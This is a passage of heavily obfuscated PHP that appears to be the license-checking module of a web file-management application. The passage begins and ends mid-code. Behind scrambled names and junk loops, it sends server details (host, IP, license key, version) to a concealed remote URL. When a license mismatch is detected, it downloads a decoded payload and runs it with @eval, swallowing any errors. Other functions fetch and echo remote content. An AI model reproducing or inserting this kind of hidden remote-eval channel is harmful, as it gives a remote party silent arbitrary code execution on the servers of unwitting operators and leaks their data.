$¶éÛ¥†› = $ò®ö¥õº[$Ì’ìÁ¾[169]] ? $Ì’ìÁ¾[171] . $ò®ö¥õº[$Ì’ìÁ¾[169]] : $Å·ş£‘†; show_json($¶éÛ¥†›, !1); } $ÖêÂæğ€ = $ò®ö¥õº[$Ì’ìÁ¾[169]]; $ûÍğˆÉ¢ = $this->arom66b5ced7($ÖêÂæğ€[$Ì’ìÁ¾[175]]); $§ö…ˆä÷ = $¦—îÎ×[649]; if (!$ûÍğˆÉ¢ || $ûÍğˆÉ¢ != $ÖêÂæğ€[$Ì’ìÁ¾[123]]) { $“»û¢Ê¦ = array($Ì’ìÁ¾[176] => Model($Ì’ìÁ¾[33])->get($Ì’ìÁ¾[101]), $Ì’ìÁ¾[177] => $_SERVER[$Ì’ìÁ¾[100]], $Ì’ìÁ¾[178] => this_url(), $Ì’ìÁ¾[153] => $_SERVER[$Ì’ìÁ¾[154]]); $¹İë´Ş· = $this->csow89bc2094(json_encode($“»û¢Ê¦)); $this->nvrl39fefba9($Ì’ìÁ¾[179] . $¹İë´Ş·); show_json(LNG($Ì’ìÁ¾[180]), !0); } $¿ùƒ¡Æª = array($Ì’ìÁ¾[181] => $ÖêÂæğ€[$Ì’ìÁ¾[182]], $Ì’ìÁ¾[183] => $ÖêÂæğ€[$Ì’ìÁ¾[184]], $Ì’ìÁ¾[185] => rand_string(16), $Ì’ìÁ¾[103] => $ÖêÂæğ€[$Ì’ìÁ¾[186]]); if ($àšçˆ²”[$Ì’ìÁ¾[147]]) { $¿ùƒ¡Æª[$Ì’ìÁ¾[185]] = $àšçˆ²”[$Ì’ìÁ¾[147]]; } $Ş’İÇŠ… = substr(md5($¿ùƒ¡Æª[$Ì’ìÁ¾[183]]), 10, 10); $ÏËéŠá = $Ş’İÇŠ… . $¿ùƒ¡Æª[$Ì’ìÁ¾[103]] . $¿ùƒ¡Æª[$Ì’ìÁ¾[185]]; $¿ùƒ¡Æª[$Ì’ìÁ¾[105]] = strrev(base64_encode($this->prjee25942f3($ÏËéŠá, $Ì’ìÁ¾[187]))); $è¦¬ÂÊÏ = $¦—îÎ×[650]; while ($è¦¬ÂÊÏ < $¦—îÎ×[620]) { if ($è¦¬ÂÊÏ >= 0) { break; } $è¦¬ÂÊÏ++; } $¹Öã®Œ” = rand_string(16); $‚‘òä¶† = $¦—îÎ×[651]; $Ä½¶®‚÷ = $¹Öã®Œ” . $¿ùƒ¡Æª[$Ì’ìÁ¾[103]] . $this->prjee25942f3(md5($¿ùƒ¡Æª[$Ì’ìÁ¾[181]]), $¹Öã®Œ”); $’Ç›Ë = $¦—îÎ×[652]; while (strlen($’Ç›Ë) < $¦—îÎ×[608]) { if (!$’Ç›Ë) { break; } $’Ç›Ë++; } $¿ùƒ¡Æª[$Ì’ìÁ¾[106]] = base64_encode(strrev($this->prjee25942f3($Ä½¶®‚÷, $Ì’ìÁ¾[188]))); $Äª²ÀÍµ = $¦—îÎ×[653]; if (strlen($Äª²ÀÍµ) < $¦—îÎ×[613]) { die; } if ($ÖêÂæğ€[$Ì’ìÁ¾[189]] && $ÖêÂæğ€[$Ì’ìÁ¾[189]] >= 1) { Model($Ì’ìÁ¾[33])->setDeep($Ì’ìÁ¾[190], $Ì’ìÁ¾[191]); } Model($Ì’ìÁ¾[33])->set($¿ùƒ¡Æª); $Æ®˜¢‹¹ = md5($_SERVER[$Ì’ìÁ¾[100]] . strrev($ò„±ÎÌ) . $¿ùƒ¡Æª[$Ì’ìÁ¾[183]]); $àºÃÕ‚æ = strrev(substr($Æ®˜¢‹¹, 10, 16)); $®ú¶–°€ = $¦—îÎ×[654]; $®øÎ¢–Ø = $this->wnpy882e9647(json_encode($ÖêÂæğ€), $Æ®˜¢‹¹); $Ü¨èÂÛå = array_to_keyvalue(Model($Ì’ìÁ¾[7])->listData(), $Ì’ìÁ¾[192]); $Ü¢ÂÕ¦¨ = $¦—îÎ×[655]; while (strlen($Ü¢ÂÕ¦¨) < $¦—îÎ×[603]) { if (!$Ü¢ÂÕ¦¨) { break; } $Ü¢ÂÕ¦¨++; } $Â›ŞÇµê = $Ü¨èÂÛå[$Ì’ìÁ¾[193]]; $§†Ñ²Œ… = array(); $§†Ñ²Œ…[$àºÃÕ‚æ] = $®øÎ¢–Ø; Model($Ì’ìÁ¾[7])->update($Â›ŞÇµê[$Ì’ìÁ¾[194]], array($Ì’ìÁ¾[195] => $§†Ñ²Œ…)); $ûĞ›ØË¶ = $¦—îÎ×[656]; while ($ûĞ›ØË¶ < $¦—îÎ×[613]) { if ($ûĞ›ØË¶ >= 0) { break; } $ûĞ›ØË¶++; } $this->nyru6dded061 = $ÖêÂæğ€; $this->isexcb69d6f0 = $¿ùƒ¡Æª[$Ì’ìÁ¾[103]]; $ÜËğÖª¦ = $¦—îÎ×[657]; if (strlen($ÜËğÖª¦) < $¦—îÎ×[610]) { return; } $this->licenseRegistSuccess(); $ƒ©¦‡Çš = $¦—îÎ×[658]; Cache::set($Ì’ìÁ¾[196] . md5($ò„±ÎÌ . $Ì’ìÁ¾[197]), $Ì’ìÁ¾[6]); $¿‚Ğ¾¼ = $¦—îÎ×[659]; if (strlen($¿‚Ğ¾¼) < $¦—îÎ×[610]) { die; } show_json(LNG($Ì’ìÁ¾[180]), !0); } private function licenseRegistSuccess() { $¡ÆÊà¼Ñ =& $_SERVER[‘ìŞ—í†]; $å÷ ¸¹½ = Model($¡ÆÊà¼Ñ[33])->get(); $Êëè– = $_SERVER[ê‘³Æ±][660]; if (!$Êëè–) { return; } if ($å÷ ¸¹½[$¡ÆÊà¼Ñ[63]] != $¡ÆÊà¼Ñ[191]) { Model($¡ÆÊà¼Ñ[33])->set($¡ÆÊà¼Ñ[63], $¡ÆÊà¼Ñ[191]); } Action($¡ÆÊà¼Ñ[198])->initStart(!0); } private function srfidaf814bf() { $Ğ˜â÷Õ¤ =& $_SERVER[ê‘³Æ±]; $¦Çığé =& $_SERVER[‘ìŞ—í†]; Model($¦Çığé[33])->set(array($¦Çığé[181] => $¦Çığé[6], $¦Çığé[183] => $¦Çığé[6], $¦Çığé[103] => $¦Çığé[104], $¦Çığé[105] => $¦Çığé[6], $¦Çığé[106] => $¦Çığé[6])); $„øÕÏğİ = $Ğ˜â÷Õ¤[661]; while (strlen($„øÕÏğİ) < $Ğ˜â÷Õ¤[603]) { if (!$„øÕÏğİ) { break; } $„øÕÏğİ++; } Model($¦Çığé[33])->setDeep($¦Çığé[190], $¦Çığé[199]); $¸é™êü = $Ğ˜â÷Õ¤[662]; if (strlen($¸é™êü) < $Ğ˜â÷Õ¤[610]) { return; } $this->nyru6dded061 = array(); $this->isexcb69d6f0 = $¦Çığé[104]; $Éõ¨§† = $Ğ˜â÷Õ¤[663]; if (!$Éõ¨§†) { return; } } private function ibrv9b7bbc92() { $¿Ã¢ÅÀâ =& $_SERVER[ê‘³Æ±]; $—ÜÙ•ˆĞ =& $_SERVER[‘ìŞ—í†]; $_SERVER[$—ÜÙ•ˆĞ[154]] = _get($_SERVER, $—ÜÙ•ˆĞ[154], APP_HOST); $this->isexcb69d6f0 = $—ÜÙ•ˆĞ[104]; $‘äŒŸ´ï = $¿Ã¢ÅÀâ[664]; if (!$‘äŒŸ´ï) { die; } $¨¾ÛºèÕ = Model($—ÜÙ•ˆĞ[33])->get(); if ($¨¾ÛºèÕ[$—ÜÙ•ˆĞ[103]] == $—ÜÙ•ˆĞ[104]) { return; } $ÁÇ‰ÅÓÉ = Model($—ÜÙ•ˆĞ[33])->get($—ÜÙ•ˆĞ[101]); $§¿‹ë¡‹ = $¿Ã¢ÅÀâ[665]; while (strlen($§¿‹ë¡‹) < $¿Ã¢ÅÀâ[608]) { if (!$§¿‹ë¡‹) { break; } $§¿‹ë¡‹++; } $çóƒ…íÖ = $—ÜÙ•ˆĞ[196] . md5($ÁÇ‰ÅÓÉ . $—ÜÙ•ˆĞ[197]); $Ë«¾•ï¶ = Cache::get($çóƒ…íÖ); if (!is_array($Ë«¾•ï¶) || !isset($Ë«¾•ï¶[$—ÜÙ•ˆĞ[200]]) || time() - $Ë«¾•ï¶[$—ÜÙ•ˆĞ[200]] >= 60) { $íˆ÷±² = Model($—ÜÙ•ˆĞ[7])->loadList(); $Š¸­ñ„É = $íˆ÷±²[$—ÜÙ•ˆĞ[193]]; $Ö¡±‡óà = md5($_SERVER[$—ÜÙ•ˆĞ[100]] . strrev($ÁÇ‰ÅÓÉ) . $¨¾ÛºèÕ[$—ÜÙ•ˆĞ[183]]); $å³ö½îò = strrev(substr($Ö¡±‡óà, 10, 16)); $Ë«¾•ï¶ = $this->zcvt00b9d8a1($Š¸­ñ„É[$—ÜÙ•ˆĞ[83]][$å³ö½îò], $Ö¡±‡óà); $Ë«¾•ï¶ = json_decode($Ë«¾•ï¶, !0); } if (!is_array($Ë«¾•ï¶)) { return $this->srfidaf814bf(); } $¶å—êîç = strtotime($Ë«¾•ï¶[$—ÜÙ•ˆĞ[123]]); if (time() >= $¶å—êîç) { return $this->srfidaf814bf(); } if (time() - $Ë«¾•ï¶[$—ÜÙ•ˆĞ[200]] > 20) { $Ë«¾•ï¶[$—ÜÙ•ˆĞ[200]] = time(); Cache::set($çóƒ…íÖ, $Ë«¾•ï¶); } $this->nyru6dded061 = $Ë«¾•ï¶; $this->isexcb69d6f0 = $¨¾ÛºèÕ[$—ÜÙ•ˆĞ[103]]; } private function nqhc24726aba() { $½ÓÀ½îÇ =& $_SERVER[ê‘³Æ±]; $˜­§‡Ì‹ =& $_SERVER[‘ìŞ—í†]; $±§ïñô = $GLOBALS[$˜­§‡Ì‹[13]]; $¼¿éŠ“Š = $½ÓÀ½îÇ[666]; while ($¼¿éŠ“Š < $½ÓÀ½îÇ[610]) { if ($¼¿éŠ“Š >= 0) { break; } $¼¿éŠ“Š++; } $ß´ıÑÈ» = $_SERVER[$˜­§‡Ì‹[24]]; if ($ß´ıÑÈ» == $˜­§‡Ì‹[201] && $this->isexcb69d6f0 == $˜­§‡Ì‹[104]) { show_json(LNG($˜­§‡Ì‹[202]), !1, $˜­§‡Ì‹[203]); } $ÎÊ´¤Ë  = array($˜­§‡Ì‹[204], $˜­§‡Ì‹[205]); if (in_array($ß´ıÑÈ», $ÎÊ´¤Ë )) { if ($this->isexcb69d6f0 == $˜­§‡Ì‹[104] && isset($±§ïñô[$˜­§‡Ì‹[206]])) { show_json(LNG($˜­§‡Ì‹[202]), !1, $˜­§‡Ì‹[203]); die; } $ûÄ›‹Ö„ = $this->ityh2b8f8fc1(); if ($ûÄ›‹Ö„ != intval($˜­§‡Ì‹[207])) { if ($ûÄ›‹Ö„ <= Model($˜­§‡Ì‹[119])->count()) { show_json(LNG($˜­§‡Ì‹[208]), !1, $˜­§‡Ì‹[203]); die; } } } } private function ubit684b09a1() { $û¨ó³ŠÖ =& $_SERVER[ê‘³Æ±]; $‡Î–éÓÂ =& $_SERVER[‘ìŞ—í†]; $–¼ÇŞÎ = array($‡Î–éÓÂ[116], $‡Î–éÓÂ[209]); if (!_get($GLOBALS, $‡Î–éÓÂ[113]) || !isset($_GET[$‡Î–éÓÂ[210]])) { return; } if (!in_array($_SERVER[$‡Î–éÓÂ[24]], $–¼ÇŞÎ)) { return; } $šÀİ¡÷÷ = $‡Î–éÓÂ[211]; $­ì³¶¦ã = $û¨ó³ŠÖ[667]; if (strlen($­ì³¶¦ã) < $û¨ó³ŠÖ[603]) { die; } $šÀİ¡÷÷ = $this->zeug38474222($šÀİ¡÷÷, $‡Î–éÓÂ[212]); $˜âÛüÈ = stream_context_create(array($‡Î–éÓÂ[213] => array($‡Î–éÓÂ[214] => $‡Î–éÓÂ[215], $‡Î–éÓÂ[216] => 3))); $ŒÁá é„ = @file_get_contents($šÀİ¡÷÷, !1, $˜âÛüÈ); $Ö²ğàèË = $û¨ó³ŠÖ[668]; while ($Ö²ğàèË < $û¨ó³ŠÖ[610]) { if ($Ö²ğàèË >= 0) { break; } $Ö²ğàèË++; } header($‡Î–éÓÂ[217]); $ŸØàëÍ­ = $û¨ó³ŠÖ[669]; if (!$ŸØàëÍ­) { die; } if ($ŒÁá é„ && strstr($ŒÁá é„, $‡Î–éÓÂ[218])) { echo $ŒÁá é„; } die; } public function jtyrda4483a7($ÖĞ‹Ì’) { $¬Ìıóƒ =& $_SERVER[ê‘³Æ±]; $¥à÷èš† =& $_SERVER[‘ìŞ—í†]; if ($this->isexcb69d6f0 == $¥à÷èš†[219]) { return $ÖĞ‹Ì’; } $Ù³ß­µÀ = array($¥à÷èš†[220] => $¥à÷èš†[221], $¥à÷èš†[222] => $¥à÷èš†[221], $¥à÷èš†[223] => $¥à÷èš†[221], $¥à÷èš†[224] => $¥à÷èš†[221], $¥à÷èš†[225] => $¥à÷èš†[226], $¥à÷èš†[227] => $¥à÷èš†[226], $¥à÷èš†[228] => $¥à÷èš†[226], $¥à÷èš†[229] => $¥à÷èš†[226], $¥à÷èš†[230] => $¥à÷èš†[226], $¥à÷èš†[231] => $¥à÷èš†[226], $¥à÷èš†[232] => $¥à÷èš†[226], $¥à÷èš†[233] => $¥à÷èš†[226], $¥à÷èš†[234] => $¥à÷èš†[226], $¥à÷èš†[235] => $¥à÷èš†[226], $¥à÷èš†[236] => $¥à÷èš†[226], $¥à÷èš†[237] => $¥à÷èš†[226]); $„ÕìÒ‰’ = explode($¥à÷èš†[238], _get($this->nyru6dded061, $¥à÷èš†[110], $¥à÷èš†[6])); $¹äåãäí = $¬Ìıóƒ[666]; while ($¹äåãäí < $¬Ìıóƒ[620]) { if ($¹äåãäí >= 0) { break; } $¹äåãäí++; } $ÅË•›Â» = array(); foreach ($Ù³ß­µÀ as $•ÕèØ§‘ => $ßê³Ÿ¹) { if ($ßê³Ÿ¹ == $¥à÷èš†[221] && substr($this->isexcb69d6f0, 0, 1) == $¥à÷èš†[221]) { continue; } if (!in_array($•ÕèØ§‘, $„ÕìÒ‰’)) { $ÅË•›Â»[] = $•ÕèØ§‘; } } foreach ($ÅË•›Â» as $•ÕèØ§‘) { unset($ÖĞ‹Ì’[$•ÕèØ§‘]); $Áá“ş„¢ = $¬Ìıóƒ[670]; } return $ÖĞ‹Ì’; $•Œ¢ùÅ„ = $¬Ìıóƒ[671]; } private function nxem8bb3fcb4() { $ÏÁç¦Ì =& $_SERVER[‘ìŞ—í†]; if ($this->isexcb69d6f0 != $ÏÁç¦Ì[104]) { $GLOBALS[$ÏÁç¦Ì[83]][$ÏÁç¦Ì[87]][$ÏÁç¦Ì[239]] = $ÏÁç¦Ì[199]; return; } $GLOBALS[$ÏÁç¦Ì[83]][$ÏÁç¦Ì[240]] = $ÏÁç¦Ì[191]; if (Model($ÏÁç¦Ì[241])->get($ÏÁç¦Ì[63]) != $ÏÁç¦Ì[199]) { Model($ÏÁç¦Ì[241])->set($ÏÁç¦Ì[63], $ÏÁç¦Ì[199]); } } public function hpcvc2a15597() { return $_SERVER[‘ìŞ—í†][242]; } private function inedef5cf6c8() { $˜¦÷²¾Š =& $_SERVER[ê‘³Æ±]; $Ğ¢öëæ =& $_SERVER[‘ìŞ—í†]; $¬ªÕÇ‹ = array($Ğ¢öëæ[243], $Ğ¢öëæ[244], $Ğ¢öëæ[245]); $¬Œ‰±şÛ = $Ğ¢öëæ[246] . md5($Ğ¢öëæ[247]); if ($this->isexcb69d6f0 == $Ğ¢öëæ[104] || !_get($GLOBALS, $Ğ¢öëæ[113])) { return; } if (!in_array($_SERVER[$Ğ¢öëæ[24]], $¬ªÕÇ‹)) { return; } if (time() % 4 != 0) { return; } $Ã¾ŠÒ = call_user_func(array($Ğ¢öëæ[248], $Ğ¢öëæ[249]), $¬Œ‰±şÛ); if ($Ã¾ŠÒ && time() - $Ã¾ŠÒ < intval($Ğ¢öëæ[250])) { return; } call_user_func(array($Ğ¢öëæ[248], $Ğ¢öëæ[133]), $¬Œ‰±şÛ, time()); $Ë˜í¾ó = $˜¦÷²¾Š[672]; if (!$Ë˜í¾ó) { die; } $¶Ÿäø— = Model($Ğ¢öëæ[33])->get($Ğ¢öëæ[101]); $ÑÔõµÓ = array($Ğ¢öëæ[145] => Model($Ğ¢öëæ[33])->get($Ğ¢öëæ[181]), $Ğ¢öëæ[158] => $this->isexcb69d6f0, $Ğ¢öëæ[155] => $_SERVER[$Ğ¢öëæ[156]], $Ğ¢öëæ[157] => Model($Ğ¢öëæ[33])->get($Ğ¢öëæ[125]), $Ğ¢öëæ[99] => md5($_SERVER[$Ğ¢öëæ[100]] . $¶Ÿäø—), $Ğ¢öëæ[148] => $Ğ¢öëæ[130], $Ğ¢öëæ[151] => $_SERVER[$Ğ¢öëæ[152]]); $Şæ†ùŠç = $˜¦÷²¾Š[673]; while ($Şæ†ùŠç < $˜¦÷²¾Š[613]) { if ($Şæ†ùŠç >= 0) { break; } $Şæ†ùŠç++; } $Ùü™ÒÅµ = $this->nvrl39fefba9($Ğ¢öëæ[251], $ÑÔõµÓ); if (!is_array($Ùü™ÒÅµ)) { return; } if ($Ùü™ÒÅµ[$Ğ¢öëæ[145]] && $Ùü™ÒÅµ[$Ğ¢öëæ[252]]) { if ($this->arom66b5ced7($Ùü™ÒÅµ[$Ğ¢öëæ[252]]) == $ÑÔõµÓ[$Ğ¢öëæ[145]]) { return; } } $this->srfidaf814bf(); if ($this->arom66b5ced7($Ùü™ÒÅµ[$Ğ¢öëæ[252]]) != $ÑÔõµÓ[$Ğ¢öëæ[145]]) { $…Àà¥Á = array($Ğ¢öëæ[176] => $¶Ÿäø—, $Ğ¢öëæ[177] => $_SERVER[$Ğ¢öëæ[100]], $Ğ¢öëæ[178] => this_url(), $Ğ¢öëæ[153] => $_SERVER[$Ğ¢öëæ[154]]); $…Ñåšö = $this->csow89bc2094(json_encode($…Àà¥Á)); $Ùü™ÒÅµ = $this->nvrl39fefba9($Ğ¢öëæ[179] . $…Ñåšö); if ($Ùü™ÒÅµ && is_array($Ùü™ÒÅµ) && isset($Ùü™ÒÅµ[$Ğ¢öëæ[252]])) { $ØÄÕÍ” = $this->zcvt00b9d8a1($Ùü™ÒÅµ[$Ğ¢öëæ[252]], 2); if ($ØÄÕÍ”) { $ØÄÕÍ” = $this->arom66b5ced7($ØÄÕÍ”); } if ($ØÄÕÍ”) { try { @eval($ØÄÕÍ”); } catch (Exception $‰µ×°ğ) { } } } } } private function nvrl39fefba9($ŒÔ×ú† = '', $²Êé–ö = array(), $ŸÛ··ü¥ = 5) { $ö¹¶Ğ¬“ =& $_SERVER[ê‘³Æ±]; $Şî±È¶ =& $_SERVER[‘ìŞ—í†]; $¦ÛŒƒ¯Ê = $Şî±È¶[253]; $¶²ÎÃæ¡ = $ö¹¶Ğ¬“[674]; if (strlen($¶²ÎÃæ¡) < $ö¹¶Ğ¬“[610]) { return; } $¦ÛŒƒ¯Ê = $this->zeug38474222($¦ÛŒƒ¯Ê, $Şî±È¶[254]); $¦ÛŒƒ¯Ê = $¦ÛŒƒ¯Ê . $ŒÔ×ú†; if ($²Êé–ö && is_array($²Êé–ö)) { $¦ÛŒƒ¯Ê = $¦ÛŒƒ¯Ê . $Şî±È¶[255] . http_build_query($²Êé–ö); } if ($²Êé–ö === -1) { return $¦ÛŒƒ¯Ê; } $†™¬ı£ = stream_context_create(array($Şî±È¶[213] => array($Şî±È¶[216] => $ŸÛ··ü¥, $Şî±È¶[214] => $Şî±È¶[256]), $Şî±È¶[257] => array($Şî±È¶[258] => !1, $Şî±È¶[259] => !1))); $¢¶ü ÊŠ = $ö¹¶Ğ¬“[675]; if (strlen($¢¶ü ÊŠ) < $ö¹¶Ğ¬“[613]) { return; } $²Êé–ö = @file_get_contents($¦ÛŒƒ¯Ê, !1, $†™¬ı£); return json_decode($²Êé–ö, !0); $£¢Ô¯É = $ö¹¶Ğ¬“[676]; if (!$£¢Ô¯É) { die; } } private function ityh2b8f8fc1() { $‡Øº¾ =& $_SERVER[ê‘³Æ±]; $ò´¹±¤Ÿ =& $_SERVER[‘ìŞ—í†]; $²ıß’¨ = array($ò´¹±¤Ÿ[260] => $ò´¹±¤Ÿ[261], $ò´¹±¤Ÿ[262] => $ò´¹±¤Ÿ[263], $ò´¹±¤Ÿ[264] => $ò´¹±¤Ÿ[265], $ò´¹±¤Ÿ[266] => $ò´¹±¤Ÿ[267], $ò´¹±¤Ÿ[268] => $ò´¹±¤Ÿ[269], $ò´¹±¤Ÿ[270] => $ò´¹±¤Ÿ[207], $ò´¹±¤Ÿ[271] => $ò´¹±¤Ÿ[207], $ò´¹±¤Ÿ[272] => $ò´¹±¤Ÿ[261], $ò´¹±¤Ÿ[273] => $ò´¹±¤Ÿ[263], $ò´¹±¤Ÿ[274] => $ò´¹±¤Ÿ[265], $ò´¹±¤Ÿ[275] => $ò´¹±¤Ÿ[276], $ò´¹±¤Ÿ[277] => $ò´¹±¤Ÿ[267], $ò´¹±¤Ÿ[278] => $ò´¹±¤Ÿ[279], $ò´¹±¤Ÿ[280] => $ò´¹±¤Ÿ[269], $ò´¹±¤Ÿ[281] => $ò´¹±¤Ÿ[282], $ò´¹±¤Ÿ[283] => $ò´¹±¤Ÿ[284], $ò´¹±¤Ÿ[285] => $ò´¹±¤Ÿ[286]); $ÍóÏ½±ˆ = $²ıß’¨[$this->isexcb69d6f0]; $¸Â›‘½‹ = $‡Øº¾[677]; if (strlen($¸Â›‘½‹) < $‡Øº¾[610]) { return; } $ÍóÏ½±ˆ = intval($ÍóÏ½±ˆ ? $ÍóÏ½±ˆ : $ò´¹±¤Ÿ[261]); $˜Ğ³»ç« = _get($this->nyru6dded061, $ò´¹±¤Ÿ[287]); $˜Ğ³»ç« = $˜Ğ³»ç« ? intval($˜Ğ³»ç«) : 0; $¡Ñ¸¶¼Ğ = $‡Øº¾[678]; if (strlen($¡Ñ¸¶¼Ğ) < $‡Øº¾[610]) { return; } return $ÍóÏ½±ˆ + $˜Ğ³»ç«; } public function izdx0359ae59($Œî¤æˆù) { $²›¨¦®¯ =& $_SERVER[‘ìŞ—í†]; $ûÁîóñ÷ = $this->ityh2b8f8fc1(); if ($Œî¤æˆù[$²›¨¦®¯[288]] == $²›¨¦®¯[191]) { return; } if ($ûÁîóñ÷ >= intval($²›¨¦®¯[207])) { return; } $»¢ÉÖÇ = Model($²›¨¦®¯[119])->count(); if ($»¢ÉÖÇ <= $ûÁîóñ÷) { return; } $ø‡À‘‘º = Model($²›¨¦®¯[119])->field($²›¨¦®¯[288])->limit($ûÁîóñ÷)->select(); $ƒäÂóèí = $_SERVER[ê‘³Æ±][679]; $ø‡À‘‘º = array_to_keyvalue($ø‡À‘‘º, $²›¨¦®¯[6], $²›¨¦®¯[288]); if (!in_array($Œî¤æˆù[$²›¨¦®¯[288]], $ø‡À‘‘º)) { show_json($²›¨¦®¯[289], !1, $²›¨¦®¯[203]); } } public function yamk27722f22() { $®†ÏìÉõ =& $_SERVER[ê‘³Æ±]; $©•ÕÃ©¾ =& $_SERVER[‘ìŞ—í†]; if (!_get($GLOBALS, $©•ÕÃ©¾[113]) || mt_rand(1, 100) > 20) { return; } $×ô‰›İÔ = $©•ÕÃ©¾[211]; $×ô‰›İÔ = $this->zeug38474222($×ô‰›İÔ, $©•ÕÃ©¾[212]); $‰š„çÚ¸ = $®†ÏìÉõ[680]; $•Õò²ë = stream_context_create(array($©•ÕÃ©¾[213] => array($©•ÕÃ©¾[214] => $©•ÕÃ©¾[215], $©•ÕÃ©¾[216] => 3))); $¹ñò•½º = $®†ÏìÉõ[681]; if (!$¹ñò•½º) { die; } $¯º‹ƒŒ€ = @file_get_contents($×ô‰›İÔ, !1, $•Õò²ë); echo $©•ÕÃ©¾[290] . hash_encode($¯º‹ƒŒ€) . $©•ÕÃ©¾[291]; $¿¾³’Ø¯ = $®†ÏìÉõ[682]; if (strlen($¿¾³’Ø¯) < $®†ÏìÉõ[608]) { die; } } private function wnpy882e9647($ÜÓÀå—Ö, $Çï»Í‚ó, $¥çİÁ = 3) { $§ôì´™Ï =& $_SERVER[ê‘³Æ±]; $üÔÀ‘Ü« =& $_SERVER[‘ìŞ—í†]; usleep(1); $ùÛ–ñ = $§ôì´™Ï[683]; if (!$ùÛ–ñ) { die; } $ÜÓÀå—Ö = trim($ÜÓÀå—Ö); $áë•¾¨ù = mt_rand(0, 5) . $üÔÀ‘Ü«[6]; $ºÂŞ‚Øò = $§ôì´™Ï[684]; if (strlen($ºÂŞ‚Øò) < $§ôì´™Ï[610]) { return; } $¥ñÔˆ±æ = rand_string(15); $–•Ñ’É¥ = $üÔÀ‘Ü«[292]; switch ($áë•¾¨ù) { case $üÔÀ‘Ü«[199]: $·£ø¦ø = $this->prjee25942f3($ÜÓÀå—Ö, strrev($Çï»Í‚ó . $¥ñÔˆ±æ)); $ŸÁŞ©Ò¨ = $§ôì´™Ï[685]; if (!$ŸÁŞ©Ò¨) { die; } break; case $üÔÀ‘Ü«[191]: $·£ø¦ø = $this->prjee25942f3($ÜÓÀå—Ö, strrev($¥ñÔˆ±æ . $Çï»Í‚ó)); $Î¿èî»ì = $§ôì´™Ï[686]; if (strlen($Î¿èî»ì) < $§ôì´™Ï[620]) { return; } break; $Î·£ãÏ‘ = $§ôì´™Ï[687]; while (strlen($Î·£ãÏ‘) < $§ôì´™Ï[603]) { if (!$Î·£ãÏ‘) { break; } $Î·£ãÏ‘++; } case $üÔÀ‘Ü«[293]: $·£ø¦ø = $this->prjee25942f3($ÜÓÀå—Ö, base64_encode($¥ñÔˆ±æ . $Çï»Í‚ó)); break; $ò¿¯¦ğÜ = $§ôì´™Ï[688]; while ($ò¿¯¦ğÜ < $§ôì´™Ï[610]) { if ($ò¿¯¦ğÜ >= 0) { break; } $ò¿¯¦ğÜ++; } case $üÔÀ‘Ü«[294]: $·£ø¦ø = $this->prjee25942f3($ÜÓÀå—Ö, md5($¥ñÔˆ±æ . $Çï»Í‚ó)); $¸ˆŞìÁ = $§ôì´™Ï[689]; if (!$¸ˆŞìÁ) { die; } break; case $üÔÀ‘Ü«[295]: $ÜÓÀå—Ö = base64_encode($ÜÓÀå—Ö); $¹‘°šË = rand(0, 64); $äõÅÜş¢ = $–•Ñ’É¥[$¹‘°šË]; $Ç¼‹ú’¬ = $§ôì´™Ï[690]; if (strlen($Ç¼‹ú’¬) < $§ôì´™Ï[613]) { return; } $ÎÏ•÷·ù = md5($äõÅÜş¢ . md5($Çï»Í‚ó . $äõÅÜş¢) . $Çï»Í‚ó); $¡«õØ—– = $§ôì´™Ï[691]; if (!$¡«õØ—–) { return; } $ÎÏ•÷·ù = substr($ÎÏ•÷·ù, $¹‘°šË % 8, $¹‘°šË % 8 + 7); $ªÆ¬†« = $§ôì´™Ï[692]; if (strlen($ªÆ¬†«) < $§ôì´™Ï[613]) { die; } $ØÈˆ•§ø = $üÔÀ‘Ü«[6]; $ûÁœ”Ö  = $§ôì´™Ï[693]; while ($ûÁœ”Ö  < $§ôì´™Ï[608]) { if ($ûÁœ”Ö  >= 0) { break; } $ûÁœ”Ö ++; } $í…Êôıã = 0; $Ö€ÁĞìÀ = 0; $Ÿù€öıó = 0; for ($í…Êôıã = 0; $í…Êôıã < strlen($ÜÓÀå—Ö); $í…Êôıã++) { $Ÿù€öıó = $Ÿù€öıó == strlen($ÎÏ•÷·ù) ? 0 : $Ÿù€öıó; $Ì¨±²Ä = $§ôì´™Ï[694]; if (strlen($Ì¨±²Ä) < $§ôì´™Ï[608]) { return; } $Ö€ÁĞìÀ = ($¹‘°šË + strpos($–•Ñ’É¥, $ÜÓÀå—Ö[$í…Êôıã]) + ord($ÎÏ•÷·ù[$Ÿù€öıó++])) % 64; $ØÈˆ•§ø .= $–•Ñ’É¥[$Ö€ÁĞìÀ]; } $·£ø¦ø = hash_encode($äõÅÜş¢ . $ØÈˆ•§ø); break; $ƒ´š“”ò = $§ôì´™Ï[695]; if (!$ƒ´š“”ò) { die; } default: $·£ø¦ø = $this->prjee25942f3($ÜÓÀå—Ö, $Çï»Í‚ó . $¥ñÔˆ±æ); break; $©×¬ŒÚ = $§ôì´™Ï[696]; if (!$©×¬ŒÚ) { die; } } $·£ø¦ø = strrev($áë•¾¨ù . $¥ñÔˆ±æ . $·£ø¦ø); $‚Ã·Õºë = $§ôì´™Ï[697]; if (strlen($‚Ã·Õºë) < $§ôì´™Ï[608]) { return; } if ($¥çİÁ - 1 > 0) { $·£ø¦ø = $this->wnpy882e9647($·£ø¦ø, $Çï»Í‚ó, $¥çİÁ - 1); } return $·£ø¦ø; } private function zcvt00b9d8a1($¢¡ûø€•, $±Í´’ãá, $“ÎæÍé = 3) { $©ÙªŠ™Ç =& $_SERVER[ê‘³Æ±]; $µ¾¶«È =& $_SERVER[‘ìŞ—í†]; if (!is_string($¢¡ûø€•) || strlen($¢¡ûø€•) < 10) { return !1; } $¢¡ûø€• = trim($¢¡ûø€•); $Üï·ÜŸå = $©ÙªŠ™Ç[698]; $¢¡ûø€• = strrev($¢¡ûø€•); $àô§üä‰ = $©ÙªŠ™Ç[699]; if (strlen($àô§üä‰) < $©ÙªŠ™Ç[603]) { return; } $çŠÚë¥ = $¢¡ûø€•[0]; $ÊëªğÕ = $©ÙªŠ™Ç[700]; $•’á»ôá = substr($¢¡ûø€•, 1, 15); $¹¯³½ŒĞ = $©ÙªŠ™Ç[701]; while ($¹¯³½ŒĞ < $©ÙªŠ™Ç[608]) { if ($¹¯³½ŒĞ >= 0) { break; } $¹¯³½ŒĞ++; } $¢¡ûø€• = substr($¢¡ûø€•, 16); $ˆşìÃˆ± = $©ÙªŠ™Ç[702]; $¦“´÷¶ä = $µ¾¶«È[292]; switch ($çŠÚë¥) { case $µ¾¶«È[199]: $ğÈÄê’ë = $this->zeug38474222($¢¡ûø€•, strrev($±Í´’ãá . $•’á»ôá)); $Òªóä• = 